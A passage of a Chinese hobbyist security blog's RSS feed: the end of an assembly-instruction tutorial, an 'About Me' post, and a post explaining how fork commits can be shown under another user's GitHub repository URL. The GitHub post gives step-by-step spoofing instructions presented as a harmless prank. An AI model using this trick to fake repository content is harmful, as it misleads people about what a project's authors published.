&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;地址&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SRC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;值&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; 把源操作数传送给目标(类似赋值语句)&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;LEA&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;REG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SRC&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; 把源操作数的有效地址送给指定的寄存器(把SRC的地址保存到…)&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;VALUE&lt;/span&gt;                 &lt;span class=&#34;c1&#34;&gt;; 把目标值压栈，同时SP指针-1字长&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;POP&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DEST&lt;/span&gt;                     &lt;span class=&#34;c1&#34;&gt;; 将栈顶的值弹出至目的存储位置，同时SP指针+1字长&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;LEAVE&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;; 在函数返回时，恢复父函数栈帧的指令(子函数调用结束后，销毁子函数栈帧)&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;RET&lt;/span&gt;                      &lt;span class=&#34;c1&#34;&gt;; 在函数返回时，控制程序执行流返回父函数的指令&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;结语&#34;&gt;结语&lt;/h2&gt;
&lt;p&gt;&lt;del&gt;(啊，终于写完了， 好累)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;花了四五个小时才搞完=  =&lt;/p&gt;
&lt;p&gt;不过嘛，能复习前面的知识并且能与大家分享.qaq.&lt;/p&gt;
&lt;p&gt;还是挺有趣的嘛= =&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;To Be Continued&amp;hellip;.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>About Me</title>
        <link>https://kira-pgr.github.io/posts/about_me/</link>
        <pubDate>Thu, 27 Jan 2022 01:03:14 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/about_me/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/about_me/yran.jpg" alt="Featured image of post About Me" /&gt;&lt;h1 id=&#34;kirapgr&#34;&gt;KiraPGR&lt;/h1&gt;
&lt;p&gt;大家好, 我是PGR, 欢迎大家来到我的Blog,&lt;/p&gt;
&lt;p&gt;本篇文章是对我自己简单的一个介绍&lt;/p&gt;
&lt;h2 id=&#34;kirapgr是谁&#34;&gt;KiraPGR是谁？&lt;/h2&gt;
&lt;p&gt;我是一个高中在读学生，开源主义者，熟悉c++/Python开发 ,平常喜欢自己折腾折腾计算机技术，也不时会写一点小Project(基本上以工具为主),目前主要在研究信息安全方面，如果有意向的朋友们可以和我一起学习哦qaq&lt;/p&gt;
&lt;h2 id=&#34;关于本博客&#34;&gt;关于本博客&lt;/h2&gt;
&lt;p&gt;搭建这个博客的目的呢，主要是为了能和大家共享我自己学到的一些知识 (&lt;del&gt;刚好就有动力写一点笔记了&lt;/del&gt; )，同时呢，还希望能结交到一些志同道合的好朋友awa&lt;/p&gt;
&lt;h2 id=&#34;联系方式&#34;&gt;联系方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;邮箱: &lt;a class=&#34;link&#34; href=&#34;mailto:aieternal@outlook.com&#34; &gt;aieternal@outlook.com&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TG: &lt;a class=&#34;link&#34; href=&#34;https://t.me/pgr47&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://t.me/pgr47&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;b站(已废弃): &lt;a class=&#34;link&#34; href=&#34;https://space.bilibili.com/66912843&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://space.bilibili.com/66912843&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;QQ: 1532375915&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;我的朋友们&#34;&gt;我的朋友们&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;黑兔由帝: &lt;a class=&#34;link&#34; href=&#34;https://space.bilibili.com/351510324/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://space.bilibili.com/351510324/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;WeepingDogel: &lt;a class=&#34;link&#34; href=&#34;https://weepingdogel.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://weepingdogel.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Kera: &lt;a class=&#34;link&#34; href=&#34;https://space.bilibili.com/37960560&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://space.bilibili.com/37960560&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux</title>
        <link>https://kira-pgr.github.io/posts/github_vuln/</link>
        <pubDate>Wed, 26 Jan 2022 21:15:07 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/github_vuln/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/github_vuln/cover.jpg" alt="Featured image of post GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux" /&gt;&lt;h1 id=&#34;github-url修改逻辑漏洞&#34;&gt;GitHub url修改逻辑漏洞&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言：&lt;/h2&gt;
&lt;p&gt;大家好，我是鸽子PGR, 这是我第一篇博客= =&lt;/p&gt;
&lt;p&gt;同时呢，这也意味着我接下来会&lt;strong&gt;放弃b站更新视频&lt;/strong&gt;，主要是想要多花一些时间提升一下自己的技术，并通过写博客的形式做笔记，毕竟做视频真的很麻烦qaq&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(其实只是因为懒   别打)&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;一-漏洞演示&#34;&gt;一. 漏洞演示&lt;/h2&gt;
&lt;p&gt;咳咳，言归正传 OwO&lt;/p&gt;
&lt;p&gt;最近刷GitHub的时候看到了&lt;a class=&#34;link&#34; href=&#34;https://github.com/torvalds/linux/tree/8bcab0346d4fcf21b97046eb44db8cf37ddd6da0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 246; 
			flex-basis: 591px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/github_vuln/Att1.png&#34; data-size=&#34;1677x681&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/github_vuln/Att1.png&#34;
			width=&#34;1677&#34;
			height=&#34;681&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/github_vuln/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/github_vuln/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;啥？Linus大神居然说Linux糟糕至极，并删除Linux项目推荐我们用Win XP&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;啥？Linus大神居然说Linux糟糕至极，并删除Linux项目推荐我们用Win XP&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Linus真的一反常态删除了Linux??&lt;/p&gt;
&lt;p&gt;很显然这是假的~&lt;/p&gt;
&lt;p&gt;或者说，这是一个硬核恶作剧= =&lt;/p&gt;
&lt;p&gt;而这个恶作剧利用了GitHub一个小小的逻辑漏洞&lt;/p&gt;
&lt;h2 id=&#34;二-漏洞复现&#34;&gt;二. 漏洞复现&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你嘤文水平不戳的话，可以参考https://news.ycombinator.com/item?id=24976138&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;想要利用这个漏洞，你只需要一个GitHub帐号和一个浏览器&lt;/p&gt;
&lt;p&gt;首先Fork某一个项目，然后在你fork的项目中随便改点东西(任意的东西都可以)&lt;/p&gt;
&lt;p&gt;&lt;del&gt;至于Fork键的位置，自己找&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;然后点进你新加上的commit&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 653; 
			flex-basis: 1569px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/github_vuln/Att2.png&#34; data-size=&#34;595x91&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/github_vuln/Att2.png&#34;
			width=&#34;595&#34;
			height=&#34;91&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/github_vuln/Att2_huee27a286e853bc37957c8994abfce6a4_7560_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/github_vuln/Att2_huee27a286e853bc37957c8994abfce6a4_7560_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;commit位置&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;commit位置&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;commit链接&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Kira-Pgr/MEMZ/commit/43ab3c1283605216e5b56388c11483fee7dcd47c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Kira-Pgr/MEMZ/commit/43ab3c1283605216e5b56388c11483fee7dcd47c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把&lt;code&gt;commit&lt;/code&gt; 改为&lt;code&gt;tree&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Kira-Pgr/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Kira-Pgr/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后，把你的id(这里演示时是Kira-Pgr)改成你想要&amp;quot;修改&amp;quot;对方项目的人的id&lt;/p&gt;
&lt;p&gt;(这里的id是NyDubh3)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/NyDubh3/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/NyDubh3/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样你修改的东西就看来像是在原项目里一样 qaq&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 322; 
			flex-basis: 773px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/github_vuln/Att3.png&#34; data-size=&#34;1878x583&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/github_vuln/Att3.png&#34;
			width=&#34;1878&#34;
			height=&#34;583&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/github_vuln/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/github_vuln/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;原项目被&amp;#34;修改&amp;#34;啦= =&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;原项目被&amp;quot;修改&amp;quot;啦= =&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;结语&#34;&gt;结语：&lt;/h2&gt;
&lt;p&gt;这个洞虽说危害不大，而且只需要判断commit是不是从一个fork来的就可以避免受到影响&lt;/p&gt;
&lt;p&gt;&lt;del&gt;但还是很好VAN的 逃)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;(⁄ ⁄•⁄ω⁄•⁄ ⁄)&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
